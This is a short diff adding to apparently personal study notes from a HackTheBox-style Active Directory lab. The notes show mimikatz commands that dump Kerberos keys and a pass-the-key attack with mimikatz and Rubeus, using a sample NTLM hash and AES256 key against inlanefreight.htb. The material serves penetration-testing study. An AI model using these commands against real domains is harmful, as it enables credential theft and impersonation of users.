@@ -480,3 +480,9 @@ mimikatz # privilege::debug
 mimikatz # sekurlsa::ekeys
 ```
 %% pass the key approach converts a hash/key for a domain-joined user into a full Ticket Granting Ticket (TGT), use ekeys cmd to enumerate all key types present for kerberos package %%
+
+```
+mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
+c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
+```
+%% pass the key attack that opens a cmd.exe window in context of the user and you can request any service on behalf of that user. First command is using mimikatz and second is using rubeus. the second command uses asktgt which asks for the tgt for that user%%
